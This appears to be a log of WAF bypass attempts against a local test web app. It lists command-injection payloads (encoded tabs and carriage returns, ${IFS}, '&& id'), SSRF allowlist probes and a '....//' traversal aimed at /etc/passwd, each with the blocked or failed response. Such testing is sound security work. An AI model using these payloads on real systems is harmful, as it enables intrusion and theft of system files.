ping: 127.0.0.1%09id: Name or service not known
technique: URL-encoded tab character (%09) as command separator, bypasses [;&|`$()\n] block

raw_stdout: ping: 127.0.0.1{IFS}id: Name or service not known
technique: Brace-expansion ${IFS} substitution without $ blocked char — literal {IFS} to test shell word-split edge case

raw_stdout: ping: 127.0.0.1%0Did: Name or service not known
technique: URL-encoded carriage return (%0D / \r) as line separator; WAF blocks \n but \r may pass separately and still trigger shell newline on some libc/bash versions

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1 -c 1 && id","pattern":"[;&|`$()\\\\n]"}
technique: Double-encoded ampersand via literal space injection: WAF regex is [;&|`$()\\n] — tests if the literal & without encoding slips through a URL-decoded pre-check gap

raw_stdout: ping: 127.0.0.1%2509id: Name or service not known
technique: Double URL-encoded tab (%25 decodes to %, then %09 = tab) — tests double-decode path in WAF vs single-decode in Flask/shell

raw_stdout: {"error":"blocked_private_ip","host":"127.0.0.1"}
technique: Use allowed scheme (https) with allowed host (127.0.0.1) — scheme+host both on whitelist; tests if port restriction is absent

raw_stdout: {"error":"blocked_host","host":"localhost"}
technique: localhost is on ssrf_allowed_hosts and https is on ssrf_allowed_schemes; attempt file read via localhost path on internal HTTP server

raw_stdout: {"error":"blocked_by_waf","match":"name=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd","pattern":"[;&|`$()\\\\n]"}
technique: Collapsed double-dot bypass: '..../' collapses to '../' after naive '..' substring strip, since the WAF blocks '..' substring but this sequence after single-pass removal yields '../'
